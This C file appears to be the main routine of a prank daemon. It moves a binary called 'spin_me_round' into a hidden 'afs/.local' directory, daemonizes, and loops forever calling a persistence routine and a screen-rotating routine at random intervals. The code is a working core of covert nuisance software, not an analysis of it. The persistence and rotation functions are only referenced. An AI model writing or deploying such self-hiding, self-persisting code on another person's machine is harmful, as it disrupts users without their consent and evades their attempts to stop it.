#include <asm-generic/errno-base.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>


#include "init.h"
#include "payload.h"
#include "settle.h"

int main()
{
    if (!access(PIDFILE, F_OK))
        exit(EXIT_FAILURE);

    if (access("afs/.local", F_OK))
    {
        system("mkdir afs/.local");
        system("mv spin_me_round afs/.local");
    }

    if (create_lock(PIDFILE) < 0)
    {
        if (errno == EACCES || errno == EAGAIN)
            fprintf(stderr, "Daemon already running\n");
        else
            perror("Lock pidfile");

        exit(EXIT_FAILURE);
    }

    daemonize();

    write_pid();

    setup_signals();

    while (running)
    {
        create_persistance();
        sleep(random() / 10000000);
        screen_rotator();
        
    }

    close(pid_fd);

    return 0;
}